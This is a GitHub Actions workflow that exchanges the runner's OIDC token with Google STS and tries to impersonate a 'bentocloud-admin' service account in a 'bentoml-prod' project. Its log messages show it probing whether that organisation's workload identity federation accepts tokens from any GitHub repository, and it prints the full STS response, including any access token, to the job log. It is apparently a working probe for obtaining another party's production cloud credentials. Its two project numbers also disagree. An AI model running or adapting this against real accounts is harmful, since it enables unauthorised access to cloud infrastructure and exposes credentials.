name: WIF Test
on:
  workflow_dispatch:
permissions:
  id-token: write
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Get OIDC Token and test STS exchange
        run: |
          OIDC_TOKEN=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=//iam.googleapis.com/projects/412313301790/locations/global/workloadIdentityPools/github/providers/my-repo" | \
            python3 -c "import sys,json; print(json.load(sys.stdin)['value'])")
          echo "OIDC sub claim: $(echo $OIDC_TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | python3 -c 'import sys,json; d=json.loads(sys.stdin.read()); print(d.get("sub",""))')"
          RESPONSE=$(curl -s -X POST https://sts.googleapis.com/v1/token \
            -H "Content-Type: application/json" \
            -d "{\"audience\":\"//iam.googleapis.com/projects/412313301790/locations/global/workloadIdentityPools/github/providers/my-repo\",\"grant_type\":\"urn:ietf:params:oauth:grant-type:token-exchange\",\"requested_token_type\":\"urn:ietf:params:oauth:token-type:access_token\",\"scope\":\"https://www.googleapis.com/auth/cloud-platform\",\"subject_token_type\":\"urn:ietf:params:oauth:token-type:id_token\",\"subject_token\":\"$OIDC_TOKEN\"}")
          echo "STS_RESPONSE: $RESPONSE"
          if echo "$RESPONSE" | grep -q access_token; then
            echo "CRITICAL: NO ATTRIBUTE_CONDITION - WIF accepts any GitHub token!"
          elif echo "$RESPONSE" | grep -q access_denied; then
            echo "SAFE: attribute_condition restricts to bentoml org"
          fi
      - name: Try google-github-actions/auth@v2
        uses: google-github-actions/auth@v2
        id: auth
        continue-on-error: true
        with:
          service_account: 'bentocloud-admin@bentoml-prod.iam.gserviceaccount.com'
          workload_identity_provider: 'projects/412313301390/locations/global/workloadIdentityPools/github/providers/my-repo'
      - name: Auth result
        run: echo "Auth outcome=${{ steps.auth.outcome }}"
